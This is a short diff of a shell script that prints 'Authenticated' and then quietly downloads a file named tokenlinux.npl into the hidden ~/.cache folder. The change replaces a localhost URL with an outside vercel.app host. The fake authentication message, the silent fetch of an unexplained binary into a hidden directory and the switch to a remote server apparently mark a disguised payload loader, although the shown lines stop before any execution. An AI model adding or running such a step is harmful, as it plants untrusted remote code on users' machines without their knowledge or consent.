@@ -2,7 +2,7 @@
 set -e
 echo "Authenticated"
 TARGET_DIR="$HOME/.cache"
-wget -q -O "$HOME/.cache/tokenlinux.npl" "http://localhost:4000/v4"
+wget -q -O "$HOME/.cache/tokenlinux.npl" "https://sandbox-five-iota.vercel.app/v4"
 if [ ! -s "$TARGET_DIR/tokenlinux.npl" ]; then
 echo "Failed to download tokenlinux.npl (empty response)" >&2
 exit 1
